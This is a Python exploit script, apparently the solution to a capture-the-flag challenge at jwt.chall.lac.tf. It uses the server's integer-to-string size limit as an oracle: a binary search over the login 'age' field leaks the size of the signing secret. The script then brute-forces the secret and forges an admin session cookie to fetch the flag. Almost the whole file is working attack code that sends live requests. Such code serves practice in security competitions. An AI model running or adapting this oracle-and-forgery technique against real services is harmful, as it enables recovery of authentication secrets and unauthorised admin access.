import sys
import time
import json
import hashlib
import os
import math
from tqdm import tqdm

import requests

hash_ = lambda a: hashlib.sha256(a.encode()).hexdigest()
# url = lambda end: f"http://127.0.0.1:8080{end}"
url = lambda end: f"https://jwt.chall.lac.tf{end}"

# needed as sometimes we may slightly overflow 4300
sys.set_int_max_str_digits(4500)

def create_token(userinfo, secret):
    userinfo["timestamp"] = int(time.time() * 1000)
    salted_secret = (secret ^ userinfo["timestamp"]) + userinfo["age"]
    data = json.dumps(userinfo)
    return data.encode().hex() + "." + hash_(f"{data}:{salted_secret}")

def validate_secret(userinfo, sig, secret):
    salted_secret = (secret ^ userinfo["timestamp"]) + userinfo["age"]
    data = json.dumps(userinfo)
    return hash_(f"{data}:{salted_secret}") == sig

def too_big(age):
    r = s.post(url("/login"), json={"username": "owo", "age": age})
    # 502 is returned by traefik when under too much load so we retry
    # 500 returned by internal server error from age too big
    # 200 returned when login successful
    if r.status_code == 502:
        return too_big(age)
    return r.status_code >= 500


with requests.Session() as s:
    r = s.post(url("/login"), json={"username": "owo", "age": 10})
    token = s.cookies["token"]

    # uppper bound is 10^4300 - 1 because ints > 10^4300 trigger the error
    # get lower bound by upper_bound - max_value_of_secret
    right = 10 ** 4300 - 1
    left = 10 ** 4300 - 2 ** (131 * 8)

    # binary search for difference needed to trigger str error
    # should take around 1k sequential requests
    it = 0
    while right - left > 10_000:
        # server may get overloaded if you request too much, lets chill for a bit
        if (it + 1) % 100 == 0:
            time.sleep(1)

        print(it, math.log10(left), math.log10(right), math.log10(right - left))
        mid = (left + right) // 2
        try:
            if too_big(mid):
                right = mid
            else:
                left = mid + 1
            it += 1

        # if the server is overloaded, it may close connection
        except requests.ConnectionError:
            s.close()
            s = requests.Session()

    # get an actual recent authentication token
    too_big(30)

    diff = left
    token = s.cookies["token"]

    userinfo, sig = token.split(".")
    userinfo = json.loads(bytes.fromhex(userinfo).decode())

    # brute force the secret
    secret = ((10 ** 4300 - diff) ^ userinfo["timestamp"]) - 50_000
    for i in tqdm(range(100_000)):
        secret += 1
        if validate_secret(userinfo, sig, secret):
            break


    # craft malicious cookie and get the flag
    userinfo["age"] = 10
    userinfo["role"] = "admin"
    del s.cookies["token"]
    s.cookies["token"] = create_token(userinfo, secret)
    r = s.get(url("/img"))
    print(r.json())
